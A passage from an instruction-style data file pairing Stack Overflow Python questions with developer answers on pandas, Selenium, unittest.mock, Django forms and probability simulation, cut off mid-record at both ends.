00:00:00\ntype: &lt;class 'pandas._libs.tslibs.timestamps.Timestamp'&gt;\ndate: 2022-01-20 00:00:00\ntime pieces: 9 30 0\n2022-01-20 00:00:00\ntype: &lt;class 'pandas._libs.tslibs.timestamps.Timestamp'&gt;\ndate: 2022-01-21 00:00:00\ntime pieces: 9 30 0\nnew timestamp: 2022-01-21 00:00:00\n<\/code><\/pre>\n<p>How can I make <code>new timestamp<\/code> incorporate the <code>datetime.time<\/code> objects so it will return the timestamps in the intended format?<\/p>\n<p>Kind regards.<\/p>\n<p><strong>Solution<\/strong>\nUse <code>pandas.DateOffset()<\/code> to offset hours, minutes and seconds instead of <code>pandas.Timestamp()<\/code>:<\/p>\n<pre><code># test.py\nimport pandas_market_calendars as mcal\nimport pandas\nimport time\nnow = pandas.Timestamp.now()\n\ndef start_of_week(multiplier, format='ms'):\n    obj = now + pandas.tseries.offsets.Week(multiplier, weekday=0)\n    obj = pandas.Timestamp(obj).floor(freq='D')\n    if format == 'ms':\n        obj = int(time.mktime(obj.timetuple()) * 1000)\n    return(obj)\n\ndef start_of_day():\n    nyse = mcal.get_calendar('NYSE')\n    market_days = nyse.schedule(start_date=start_of_week(-1, None), end_date=now)\n    for date in market_days.index.to_list():\n        print(date + pandas.DateOffset(hour=nyse.open_time.hour, minute=nyse.open_time.minute, second=nyse.open_time.second))\nstart_of_day()\n<\/code><\/pre>\n<pre><code># python3 test.py\n2022-01-18 09:30:00\n2022-01-19 09:30:00\n2022-01-20 09:30:00\n2022-01-21 09:30:00\n<\/code><\/pre>","output_text":"<p>Solution:<\/p>\n<pre><code>pandas.DateOffset(hour=nyse.open_time.hour, minute=nyse.open_time.minute, second=nyse.open_time.second)\n<\/code><\/pre>\n<p>Original question updated.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python Selenium: How do I print the correct tag?<p>I am trying to print by ID using Selenium. As far as I can tell, &quot;a&quot; is the tag and &quot;title&quot; is the attribute. See HTML below.<\/p>\n<p>When I run the following code:<\/p>\n<pre><code>print(driver.find_elements(By.TAG_NAME, &quot;a&quot;)[0].get_attribute('title'))\n<\/code><\/pre>\n<p>I get the output:<\/p>\n<pre><code>Zero Tolerance\n<\/code><\/pre>\n<p>So I'm getting the first attribute correctly. When I increment the code above:<\/p>\n<pre><code>print(driver.find_elements(By.TAG_NAME, &quot;a&quot;)[1].get_attribute('title'))\n<\/code><\/pre>\n<p>My expected output is:<\/p>\n<pre><code>Aaliyah Love\n<\/code><\/pre>\n<p>However, I'm just getting blank. No errors. What am I doing incorrectly? Pls don't suggest using xpath or css, I'm trying to learn Selenium tags.<\/p>\n<p>HTML:<\/p>\n<pre><code>&lt;a class=&quot; Link ScenePlayer-ChannelName-Link styles_1lHAYbZZr4 Link ScenePlayer-ChannelName-Link styles_1lHAYbZZr4&quot; href=&quot;\/en\/channel\/ztfilms&quot; title=&quot;Zero Tolerance&quot; rel=&quot;&quot;&gt;Zero Tolerance&lt;\/a&gt;\n\n...\n&lt;a class=&quot; Link ActorThumb-ActorImage-Link styles_3dXcTxVCON Link ActorThumb-ActorImage-Link styles_3dXcTxVCON&quot; href=&quot;\/[RETRACTED]\/Aaliyah-Love\/63565&quot; title=&quot;Aaliyah Love&quot; \n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/U7z9p.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/U7z9p.png\" alt=\"Screenshot of HTML\" \/><\/a><\/p>","output_text":"<p>Selenium locators are a toolbox and you're saying you only want to use a screwdriver (<code>By.TAG_NAME<\/code>) for all jobs. We aren't saying that you shouldn't use <code>By.TAG_NAME<\/code>, we're saying that you should use the right tool for the right job and sometimes (most times) <code>By.TAG_NAME<\/code> is not the right tool for the job. CSS selectors are WAY more powerful locators because they can search for not only tags but also classes, properties, etc.<\/p>\n<p>It's hard to say for sure what's going on without access to the site\/page. It could be that the entire page isn't loaded and you need to add a wait for the page to finish loading (maybe count links expected on the page?). It could be that your locator isn't specific enough and is catching other A tags that don't have a title attribute.<\/p>\n<p>I would start by doing some debugging.<\/p>\n<pre><code>links = driver.find_elements(By.TAG_NAME, &quot;a&quot;)\nfor link in links:\n    print(link.get_attribute('title'))\n<\/code><\/pre>\n<p>What does this print?<\/p>\n<ol>\n<li><p>If it prints some blank lines sprinkled throughout the actual titles, your locator is probably not specific enough. Try a CSS selector<\/p>\n<pre><code>links = driver.find_elements(By.CSS_SELECTOR, &quot;a[title]&quot;)\nfor link in links:\n    print(link.get_attribute('title'))\n<\/code><\/pre>\n<\/li>\n<li><p>If instead it returns some titles and then nothing but blank lines, the page is probably not fully loaded. Try something like<\/p>\n<pre><code>count = 20 # the number of expected links on the page\nlink_locator = (By.TAG_NAME, &quot;a&quot;)\nWebDriverWait(driver, 10).until(lambda wd: len(wd.find_elements(link_locator)) == count)\nlinks = driver.find_elements(link_locator)\nfor link in links:\n    print(link.get_attribute('title'))\n<\/code><\/pre>\n<\/li>\n<\/ol>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python 2.x: How to mock subprocess.Popen if stdin=PIPE<p>I am trying to mock below function<\/p>\n\n<pre><code>from subprocess import Popen, PIPE    \ndef run_query():\n    sql_cmd = \"Some Query\"\n    process = Popen([\"sqlplus\", \"-S\", \"\/\", \"as\", \"sysdba\"], stdin=PIPE, stdout=PIPE, stderr=PIPE)\n    process.stdin.write(sql_cmd)\n    (process_stdout, process_stderr) = process.communicate()\n<\/code><\/pre>\n\n<p>Below is the test function I wrote:<\/p>\n\n<pre><code>@patch('subprocess.Popen')\ndef test_run_query(Popen):\n    Popen.return_value.communicate.return_value = (2, 1)\n<\/code><\/pre>\n\n<p>However, I am getting below error<\/p>\n\n<pre><code>Error occured while running sql command\nError output:\n[Errno 2] No such file or directory\nF\n<\/code><\/pre>\n\n<p>I tried other stackoverflow post but this kind of example is not there. Any help please.<\/p>","output_text":"<p>You are patching <code>Popen<\/code> within the wrong namespace.<\/p>\n\n<p>You need to patch the name <code>Popen<\/code> in the namespace where it is looked up, not where it is defined. Assuming <code>mypackage\/mymodule.py<\/code> is the module in which <code>run_query<\/code> is defined:<\/p>\n\n<pre><code>from mypackage.mymodule import run_query\n\n@patch('mypackage.mymodule.Popen')\ndef test_run_query(mock_popen):\n    proc = mock_popen.return_value\n    proc.communicate.return_value = \"2\", \"1\"\n    out, err = run_query()\n    assert out == \"2\"\n    assert err == \"1\"\n    proc.stdin.write.assert_called_once_with(\"Some Query\")\n<\/code><\/pre>\n\n<p>See <a href=\"https:\/\/docs.python.org\/3\/library\/unittest.mock.html#where-to-patch\" rel=\"nofollow noreferrer\"><em>Where to patch<\/em><\/a> in the mock documentation for more info.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python - have a function output multiple data frames<p>I would like to achieve the following.<\/p>\n<ol>\n<li>I would like the function to output a separate data frame for each stock for example<\/li>\n<li>I would like to save each data frame to a separate csv<\/li>\n<\/ol>\n<p>the code doesnt work and i am unable to output the and save the separate csvs. Can you help me output separate dataframes and export the respective CSVS?<\/p>\n<pre><code>    def getdata(stock: str):\n        # Company Quote Group of Items\n        company_quote = requests.get(f&quot;https:\/\/financialmodelingprep.com\/api\/v3\/quote\/{stock}?apikey=demo&quot;)\n        company_quote = company_quote.json()\n        share_price = float(&quot;{0:.2f}&quot;.format(company_quote[0]['price']))\n        \n        # Balance Sheet Group of Items    \n        BS = requests.get(f&quot;https:\/\/financialmodelingprep.com\/api\/v3\/income-statement\/{stock}?period=quarter&amp;limit=400&amp;apikey=demo&quot;)\n        BS = BS.json()\n        #Total Debt\n        debt = float(&quot;{0:.2f}&quot;.format(float(BS[0]['totalDebt'])\/10**9))\n        #Total Cash\n        cash = float(&quot;{0:.2f}&quot;.format(float(BS[0]['cashAndShortTermInvestments'])\/10**9))\n       \n        # Income Statement Group of Items\n        IS = requests.get(f&quot;https:\/\/financialmodelingprep.com\/api\/v3\/income-statement\/{stock}?period=quarter&amp;limit=400&amp;apikey=demo&quot;)\n        IS = IS.json()\n        # Most Recent Quarterly Revenue\n        qRev = float(&quot;{0:.2f}&quot;.format(float(IS[0]['revenue'])\/10**9))\n       \n        # Company Profile Group of Items\n        company_info = requests.get(f&quot;https:\/\/financialmodelingprep.com\/api\/v3\/profile\/{stock}?apikey=demo&quot;)\n        company_info = company_info.json()\n        # Chief Executive Officer\n        ceo = (company_info[0]['ceo'])\n        return (share_price, cash, debt, qRev, ceo)\n    \n    stocks = ('AAPL')\n    d = {}\n    for stock in stocks:\n        df[stock] = pd.DataFrame(getdata, columns=['Share Price','Total Cash', 'Total Debt', 'Q3 2019 Revenue', 'CEO'], index=tickers)\n    print(d)\n<\/code><\/pre>","output_text":"<p>I'm not sure to understand your question. But if the fact is that you want a different DataFrame for each ticker, here is a solution.<\/p>\n<p>Instead of :<\/p>\n<pre><code>for stock in stocks:\n    df[stock] = pd.DataFrame(....\n<\/code><\/pre>\n<p>Try:<\/p>\n<pre><code>for stock in stocks:\n    globals()['df_%s' %stock] = pd.DataFrame(...\n    # And to save it, inside the loop\n    globals()['df_%s' %stock].to_csv(stock+'.csv')\n<\/code><\/pre>\n<p>EDIT:<\/p>\n<p>Thanx for the add. Here is the code<\/p>\n<pre><code>import joblib\nfrom joblib import Parallel,delayed\nimport requests\nimport pandas as pd\n\ndef getdata(stock):\n    \n    # Company Quote Group of Items\n    company_quote = requests.get(f&quot;https:\/\/financialmodelingprep.com\/api\/v3\/quote\/{stock}?apikey=demo&quot;)\n    company_quote = company_quote.json()\n    share_price = float(&quot;{0:.2f}&quot;.format(company_quote[0]['price']))\n    \n    # Balance Sheet Group of Items    \n    BS = requests.get(f&quot;https:\/\/financialmodelingprep.com\/api\/v3\/balance-sheet-statement\/{stock}?period=quarter&amp;limit=400&amp;apikey=demo&quot;)\n    BS = BS.json()\n    #Total Debt\n    debt = float(&quot;{0:.2f}&quot;.format(float(BS[0]['totalDebt'])\/10**9))\n    #Total Cash\n    cash = float(&quot;{0:.2f}&quot;.format(float(BS[0]['cashAndShortTermInvestments'])\/10**9))\n    \n    # Income Statement Group of Items\n    IS = requests.get(f&quot;https:\/\/financialmodelingprep.com\/api\/v3\/income-statement\/{stock}?period=quarter&amp;limit=400&amp;apikey=demo&quot;)\n    IS = IS.json()\n    # Most Recent Quarterly Revenue\n    qRev = float(&quot;{0:.2f}&quot;.format(float(IS[0]['revenue'])\/10**9))\n    \n    # Company Profile Group of Items\n    company_info = requests.get(f&quot;https:\/\/financialmodelingprep.com\/api\/v3\/profile\/{stock}?apikey=demo&quot;)\n    company_info = company_info.json()\n    # Chief Executive Officer\n    ceo = (company_info[0]['ceo'])\n\n    globals()['df_%s' %stock] = pd.DataFrame({'symbol':[stock],'debt':[debt],'cash':[cash],'qRev':[qRev],'ceo':[ceo]})\n\n    globals()['df_%s' %stock].to_csv(stock+'.csv')\n    return(globals()['df_%s' %stock])\n\nstocks = ['AAPL'] #, 'MSFT', 'GOOG', 'T', 'CSCO', 'INTC', 'ORCL', 'AMZN', 'FB', 'TSLA', 'NVDA']\n\nnumber_of_cpu = joblib.cpu_count()\ndelayed_funcs = [delayed(getdata)(stock) for stock in stocks]\nparallel_pool = Parallel(n_jobs=number_of_cpu,prefer=&quot;processes&quot;) # processes threads\nglobals()['df_%s' %stock] = parallel_pool(delayed_funcs)\ndf_AAPL\n<\/code><\/pre>\n<p>OUTPUT<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/psvrN.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/psvrN.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/mf9U5.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/mf9U5.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>It isn't necessary to return the DataFrame, as you save it in the function. But I did it to show you the possibility.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to filter a pandas dataframe by string values and matching integers in rows?<p>Thank you for your help. I am still relatively new to pandas and do not observe this specific kind of query in search results.<\/p>\n\n<p>I have a pandas dataframe:<\/p>\n\n<pre><code>+-----+---------+----------+\n| id  |  value  | match_id |\n+-----+---------+----------+\n| A10 | grass   |        1 |\n| B45 | cow     |        3 |\n| B98 | bird    |        6 |\n| B17 | grass   |        1 |\n| A20 | tree    |        2 |\n| A87 | farmer  |        5 |\n| B11 | grass   |        1 |\n| A33 | chicken |        4 |\n| B56 | tree    |        2 |\n| A23 | farmer  |        5 |\n| B65 | cow     |        3 |\n+-----+---------+----------+\n<\/code><\/pre>\n\n<p>I need to filter this dataframe for rows that contain matching <code>match_id<\/code> values, with the condition that the <code>id<\/code> column <em>must also contain<\/em> both strings <code>A<\/code> <strong><em>and<\/em><\/strong> <code>B<\/code>. <\/p>\n\n<p>This is the expected output:<\/p>\n\n<pre><code>+-----+-------+----------+\n| id  | value | match_id |\n+-----+-------+----------+\n| A10 | grass |        1 |\n| B17 | grass |        1 |\n| A20 | tree  |        2 |\n| B11 | grass |        1 |\n| B56 | tree  |        2 |\n+-----+-------+----------+\n<\/code><\/pre>\n\n<p>How can I do this in, say, a single line of pandas code? Reproducible program below:<\/p>\n\n<pre><code>import pandas as pd\n\ndata_example = {'id': ['A10', 'B45', 'B98', 'B17', 'A20', 'A87', 'B11', 'A33', 'B56', 'A23', 'B65'], \n                'value': ['grass', 'cow', 'bird', 'grass', 'tree', 'farmer', 'grass', 'chicken', 'tree', 'farmer', 'cow'], \n                'match_id': [1, 3, 6, 1, 2, 5, 1, 4, 2, 5, 3]}\ndf_example = pd.DataFrame(data=data_example)\n\ndata_expected = {'id': ['A10', 'B17', 'A20', 'B11', 'B56'], \n                'value': ['grass', 'grass', 'tree', 'grass', 'tree'], \n                'match_id': [1, 1, 2, 1, 2]}\ndf_expected = pd.DataFrame(data=data_expected)\n<\/code><\/pre>\n\n<p>Thank you!<\/p>","output_text":"<p>Single line seems hard, but you can <code>str.extract<\/code> the two strings you want from id, then <code>groupby<\/code> match_id and use <code>any<\/code> to see if at least a row per match_id will have one of the string you want, then using <code>all<\/code> with axis 1 will give <code>True<\/code> to match_id that both strings. Then you can use the series just created to select only True match_id after <code>map<\/code> match_id column.<\/p>\n\n<pre><code>s = df_example['id'].str.extract('(A)|(B)').notna()\\\n                    .groupby(df_example['match_id']).any().all(1)\ndf_expected = df_example.loc[df_example['match_id'].map(s), :]\n\nprint (df_expected)\n    id  value  match_id\n0  A10  grass         1\n3  B17  grass         1\n4  A20   tree         2\n6  B11  grass         1\n8  B56   tree         2\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Multiple instances of unique variables in dataframe column<p>I'm working with a Pandas dataframe, and have a column of dependant variables (called CLASS), which consists of three classes: Y, N, and P.\nHowever, when I run -<\/p>\n<pre><code>df.CLASS.unique()\n<\/code><\/pre>\n<p>I get -<\/p>\n<pre><code>array(['N', 'N ', 'P', 'Y', 'Y '], dtype=object)\n<\/code><\/pre>\n<p>I opened up the dataset in Excel, and tried using the filter to see how many unique variables were in the column; Excel says there are only 3.<\/p>\n<p>The dataset is available <a href=\"https:\/\/www.researchgate.net\/publication\/343350334_Iraqi_Patiant_Dataset_of_Diabetes_IPDD\" rel=\"nofollow noreferrer\">here<\/a> if it's of any benefit.<\/p>","output_text":"<p>&quot;N with a space&quot; and a &quot;single N&quot;, both are different in Pandas, but <strong>I think<\/strong>, for Excel, they are the same.<br>\nYou have to preprocess that data, use this:<\/p>\n<pre><code>df['CLASS'] = df['CLASS'].replace('N ', 'N')\ndf['CLASS'] = df['CLASS'].replace('Y ', 'Y')\n<\/code><\/pre>\n<p><code>df.CLASS.unique()<\/code> You will get 3 classes after that.<\/p>\n<pre><code>array(['N', 'P', 'Y'], dtype=object)\n<\/code><\/pre>\n<p>Update: I tried running <code>=UNIQUE(N2:N1001)<\/code> this command to find uniques in Excel, and it has returned me 5 values. So, IDK what's wrong with your Excel.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How do I update blog article in django using model forms?<p>I am creating a blog using django. I am using model Forms for input.I want to edit an existing blog post, but I can't get this to work.<\/p>\n<p><strong>models.py<\/strong><\/p>\n<pre><code>class tags(models.Model):\nname = models.CharField(max_length = 30)\ndef __str__(self):\n    return self.name\n\nclass Article(models.Model):\n    title = models.CharField(max_length=60)\n    post = HTMLField()\n    editor = models.ForeignKey(User,on_delete=models.CASCADE)\n    tag = models.ManyToManyField(tags,blank=True)\n    pub_date = models.DateTimeField(auto_now_add=True)\n    article_image = models.ImageField(upload_to='articles\/', blank=True)\n    photo_credits = models.CharField(max_length=60,default='unsplash.com')\n<\/code><\/pre>\n<p><strong>Forms.py<\/strong><\/p>\n<pre><code>class UpdateArticleForm(forms.ModelForm):\nclass Meta:\n    model = Article\n    fields = ['title','article_image','post','tags','photo_credits']\n<\/code><\/pre>\n<p><strong>Views.py<\/strong><\/p>\n<pre><code>@login_required(login_url='\/accounts\/login\/')\n    def update_article(request,id):\n    instance = Article.objects.get(id = id)\n    if request.method == 'POST':\n        form = UpdateArticleForm(request.POST, request.FILES,instance=instance)\n        if form.is_valid():\n            form.save()\n            return redirect('index')\n    else:\n        form = UpdateArticleForm(instance=instance)\n    return render(request,'article\/update.html',{'form':form})\n<\/code><\/pre>\n<p><strong>urls.py<\/strong><\/p>\n<pre><code>url(r'^article\/update\/$',views.update_article,name='update_article'),\n<\/code><\/pre>\n<p>I get a 404 error.and if I replace the url with the below I get a <code>Reverse for 'update_article' with no arguments not found. 1 pattern(s) tried: ['article\/update\/(?P&lt;id&gt;[0-9]+)\/$'] <\/code><\/p>\n<pre><code>    url(r'^article\/update\/(?P&lt;id&gt;[0-9]+)\/$',views.update_article,name='update_article'),\n<\/code><\/pre>\n<p>How can I get this to work ?<\/p>","output_text":"<p>Your views and url configurations are correct, errors probably reside in your templates. Try to find <code>{% url &quot;update_article&quot; %}<\/code> in your template and replace with\n<code>{% url &quot;update_article&quot; &lt;article_id&gt; %}<\/code><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Selecting minimum value between columns python<p>I have a DataFrame that looks like the below. &quot;Name&quot; represents a student name and values below each of the Test variables represent the test grade.<\/p>\n<pre><code>Name Test1 Test2 Test3\nAna  87    93    82\nCole 62    73    84\nSia  64    58    60\nMax  93    95    99\nLeah 93    90    85\nCam  76    80    83\n<\/code><\/pre>\n<p>The desired result is the DataFrame below. Where &quot;MinTestGrade&quot; represents that lowest grade each student earned between the 3. &quot;TestNumber&quot; is the Test they got the lowest grade on.<\/p>\n<pre><code>Name TestNumber MinTestGrade\nAna  3          82\nCole 1          62\nSia  2          58\nMax  1          93\nLeah 3          85\nCam  1          76\n<\/code><\/pre>\n<p>How can I do this using python?<\/p>","output_text":"<p>You can pass <code>idxmin<\/code> and <code>min<\/code> to <code>agg<\/code> on axis to find the minimum grade and the column name, i.e. TestNumber, that it corresponds to for each student. Then <code>join<\/code> the outcome with &quot;Name&quot;, rename the columns and finally strip the word &quot;Test&quot; from &quot;TestNumber&quot;:<\/p>\n<pre><code>out = df[['Name']].join(df.filter(like='Test').agg(['idxmin', 'min'], axis=1)).rename(columns={'idxmin':'TestNumber', 'min':'MinTestGrade'})\nout['TestNumber'] = out['TestNumber'].str.lstrip('Test').astype(int)\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>   Name  TestNumber MinTestGrade\n0   Ana           3           82\n1  Cole           1           62\n2   Sia           2           58\n3   Max           1           93\n4  Leah           3           85\n5   Cam           1           76\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Django. How to remove a field from objects in the database?<p>First, field  <code>division<\/code> had choices with list of available divisions with  <code>default='No' <\/code>.\nThen it ceased to be necessary, i tried just delete field from model, but get <strong>django.core.exceptions.FieldError: Unknown field(s) (division) specified for Team<\/strong>. Then i remove choice, default and set <code>division='None'<\/code> for all objects. I thought if the value is null (None) then the field can be safely removed, but got the same <strong>FieldError: Unknown field(s) specified<\/strong> again.<\/p>\n<blockquote>\n<p>How can I remove a field from a model, If the database already contains objects with specified field?<\/p>\n<\/blockquote>\n<h3>models.py<\/h3>\n<pre><code>class Team(models.Model):\n    name = models.CharField(&quot;Name&quot;, max_length=50, unique=True)\n    image = models.ImageField(&quot;Logo&quot;, upload_to=&quot;img\/teams&quot;,default=&quot;img\/team.jpg&quot;)\n    city = models.CharField(&quot;City&quot;,max_length=30, default=&quot;Moscow&quot;)\n    division = models.CharField(&quot;Division&quot;, max_length=50, null=True)\n    url = models.SlugField(\n        max_length=30,\n        unique=True)\n    def __str__(self):\n        return self.name\n<\/code><\/pre>","output_text":"<blockquote>\n<p>I tried just delete field from model, but get <code>django.core.exceptions.FieldError: Unknown field(s) (division) specified for Team<\/code>.<\/p>\n<\/blockquote>\n<p>That <code>FieldError<\/code> is likely because you use <code>Team<\/code> in a <code>ModelForm<\/code>, <code>ModelAdmin<\/code>, <code>ModelSerializer<\/code>, or something else where <strong>you specified that field<\/strong>. For example a <code>ModelForm<\/code> with:<\/p>\n<pre><code>class TeamForm(forms.ModelForm):\n    class Meta:\n        model = Team\n        #       reference to division &downarrow;\n        fields = ['name', 'city', <b>'division'<\/b>]<\/code><\/pre>\n<p>You thus should look at the <em>traceback<\/em> and find out what form, etc. is referencing to that field and update all the referencing items accordingly.<\/p>\n<p>After doing that you can make a migration where <code>division<\/code> will be removed from the model.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How can I modify the following program to simulate a biased coin?<p>The problem is as follows:<\/p>\n<blockquote>\n<p>Simulate flipping three fair coins and counting the number X of heads.<\/p>\n<ol>\n<li>Use your simulation to estimate P(X = 1) and EX. Compare the estimates with the true values, derived from theoretical computations.<\/li>\n<li>Modify the above to allow for a biased coin where P(heads)=3\/4.<\/li>\n<\/ol>\n<\/blockquote>\n<p>I have been able to simulate an unbiased coin as follows:<\/p>\n<pre><code>import random\n\n\nSIMULATION_COUNT = 9999999\n\ncoin_surface_dictionary = {'H':0.5, 'T': 0.5}\n\ndef get_coin_surface():\n    return random.choice(['H', 'T'])\n\ndef get_three_coin_surface():\n    list_vector = []\n    list_vector.append(get_coin_surface())\n    list_vector.append(get_coin_surface())\n    list_vector.append(get_coin_surface())\n    return list_vector\n\n\nif __name__ == &quot;__main__&quot;:\n    one_head_count_int = 0\n    for ch in range(1, SIMULATION_COUNT):\n        coin_surface_vector = get_three_coin_surface()\n        head_count_int = coin_surface_vector.count(&quot;H&quot;)\n        if head_count_int == 1:\n            one_head_count_int = one_head_count_int + 1\n        # END if\n    # END for loop\n    probability = one_head_count_int \/ SIMULATION_COUNT\n    print(probability)\n<\/code><\/pre>\n<p>How can I simulate a biased coin by minimally modifying this source code?<\/p>","output_text":"<p>Either retain your <code>random.choice<\/code> but choose between <code>('H', 'H', 'H', 'T')<\/code>, or just ask for a float between [0, 1] and compare to 0.75. If higher, then it's tails, otherwise heads.<\/p>\n<p>A somewhat-robust method of using your dictionary that takes into account the probability sum:<\/p>\n<pre><code>from random import random\n\nSIDE_PROBABILITIES = {'H': 0.75, 'T': 0.25}\n\n\ndef prob_of(side: str) -&gt; float:\n    return SIDE_PROBABILITIES[side] \/ sum(SIDE_PROBABILITIES.values())\n\n\ndef get_coin_surface() -&gt; str:\n    return 'H' if random() &lt; prob_of('H') else 'T'\n\n\nfor _ in range(10):\n    print(get_coin_surface())\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Find day difference between two dates<p>I have two dataframes one is failures dataframe and the other is maintenance dataframe.<\/p>\n<p>I want to find the number of days difference between the records of both these dataframes based on some conditions.<\/p>\n<p>Condition is-<\/p>\n<ol>\n<li>There are multiple machineIDs and component numbers <code>comp1, comp2, comp3, comp4<\/code>. So, the operation needs to be performed on each\nmachineID and component number such that for every machineID and its component number I have the day difference between failure and maintenance date.<\/li>\n<li>First remove duplicate dates from\nmaintenance dataframe.<\/li>\n<li>Maintenance date should be older than failure\ndate and there can be multiple dates from maintenance dataframe\nwhich are older than failures date.<\/li>\n<li>So, averaging out after finding\ntheir difference and appending it in the failures dataframe as a new\ncolumn.<\/li>\n<\/ol>\n<p>The failures dataframe is-<\/p>\n<pre><code>            datetime        machineID   failure\n0          2021-02-04           1        comp3\n1          2021-03-21           1        comp1\n2          2021-04-05           1        comp4\n3          2021-05-05           1        comp3\n4          2021-05-20           1        comp2\n5          2021-06-04           1        comp4\n6          2021-06-19           1        comp2\n7          2021-08-03           1        comp3\n8          2021-08-03           1        comp4\n9          2021-11-01           1        comp4\n<\/code><\/pre>\n<p>And this is the maintenance dataframe<\/p>\n<pre><code>    datetime        machineID   comp\n0   2020-07-01          1      comp4\n1   2020-09-14          1      comp1\n2   2020-09-14          1      comp2\n3   2020-11-13          1      comp3\n4   2021-01-05          1      comp1\n5   2021-01-20          1      comp1\n6   2021-02-04          1      comp3\n7   2021-02-19          1      comp3\n8   2021-03-06          1      comp3\n9   2021-03-21          1      comp1\n<\/code><\/pre>\n<p>I am taking an example from <code>failures dataframe<\/code> for <code>index 1<\/code> with <code>machineID 1<\/code>, <code>datetime 2021-03-21<\/code> and <code>failure of Component 1<\/code>. Now, if see for the same machineID and component1 in maintenance dataframe, there are 3 dates which are older than the one in failures dataframe i.e., <code>2021-03-21<\/code>. Now, I want to calculate day difference of 2021-03-21 from all these 3 dates of maintenance dataframe and average it out and append it the same index of failure dataframe.<\/p>\n<p>failure datetime- <code>2021-03-21<\/code><\/p>\n<p>maintenance datetime- <code>2020-09-14; 2021-01-05; 2021-01-20<\/code><\/p>\n<p>Corresponding day difference- <code>188 days, 75 days; 60 days.<\/code><\/p>\n<p>Average of these 3- <code>(188+75+60)\/3= 108 days.<\/code><\/p>\n<p>This is something I want-<\/p>\n<pre><code>            datetime        machineID   failure     day_dif\n\n1          2021-03-21           1        comp1       108 days\n<\/code><\/pre>\n<p>Similarly for <code>component 2, 3 and 4<\/code><\/p>\n<p>Edit1- As per @oskros answer, I am getting this error-<\/p>\n<pre><code>---------------------------------------------------------------------------\nNotImplementedError                       Traceback (most recent call last)\n\/anaconda\/envs\/sklearnEnv\/lib\/python3.6\/site-packages\/pandas\/core\/groupby\/generic.py in _cython_agg_blocks(self, how, alt, numeric_only, min_count)\n   1028                 result, _ = self.grouper.aggregate(\n-&gt; 1029                     block.values, how, axis=1, min_count=min_count\n   1030                 )\n\n\/anaconda\/envs\/sklearnEnv\/lib\/python3.6\/site-packages\/pandas\/core\/groupby\/ops.py in aggregate(self, values, how, axis, min_count)\n    580         return self._cython_operation(\n--&gt; 581             &quot;aggregate&quot;, values, how, axis, min_count=min_count\n    582         )\n\n\/anaconda\/envs\/sklearnEnv\/lib\/python3.6\/site-packages\/pandas\/core\/groupby\/ops.py in _cython_operation(self, kind, values, how, axis, min_count, **kwargs)\n    510 \n--&gt; 511         func, values = self._get_cython_func_and_vals(kind, how, values, is_numeric)\n    512 \n\n\/anaconda\/envs\/sklearnEnv\/lib\/python3.6\/site-packages\/pandas\/core\/groupby\/ops.py in _get_cython_func_and_vals(self, kind, how, values, is_numeric)\n    410         try:\n--&gt; 411             func = self._get_cython_function(kind, how, values, is_numeric)\n    412         except NotImplementedError:\n\n\/anaconda\/envs\/sklearnEnv\/lib\/python3.6\/site-packages\/pandas\/core\/groupby\/ops.py in _get_cython_function(self, kind, how, values, is_numeric)\n    385             raise NotImplementedError(\n--&gt; 386                 f&quot;function is not implemented for this dtype: &quot;\n    387                 f&quot;[how-&gt;{how},dtype-&gt;{dtype_str}]&quot;\n\nNotImplementedError: function is not implemented for this dtype: [how-&gt;max,dtype-&gt;object]\n\nDuring handling of the above exception, another exception occurred:\n\nAssertionError                            Traceback (most recent call last)\n\/anaconda\/envs\/sklearnEnv\/lib\/python3.6\/site-packages\/pandas\/core\/groupby\/generic.py in _cython_agg_blocks(self, how, alt, numeric_only, min_count)\n   1060                     # unwrap DataFrame to get array\n-&gt; 1061                     assert len(result._data.blocks) == 1\n   1062                     result = result._data.blocks[0].values\n\nAssertionError: \n\nDuring handling of the above exception, another exception occurred:\n\nAssertionError                            Traceback (most recent call last)\n&lt;ipython-input-119-02d194427401&gt; in &lt;module&gt;\n      1 # 1) Remove duplicates in maintenance dataframe, by getting the latest maintenance date\n      2 #    for each combination of machineID and comp\n----&gt; 3 maint_df = maint.groupby(['machineID', 'comp']).max().reset_index()\n      4 \n      5 # 2) Merge the two dataframes so we have maintenance and failure dates for each\n\n\/anaconda\/envs\/sklearnEnv\/lib\/python3.6\/site-packages\/pandas\/core\/groupby\/groupby.py in f(self, **kwargs)\n   1376                 # try a cython aggregation if we can\n   1377                 try:\n-&gt; 1378                     return self._cython_agg_general(alias, alt=npfunc, **kwargs)\n   1379                 except DataError:\n   1380                     pass\n\n\/anaconda\/envs\/sklearnEnv\/lib\/python3.6\/site-packages\/pandas\/core\/groupby\/generic.py in 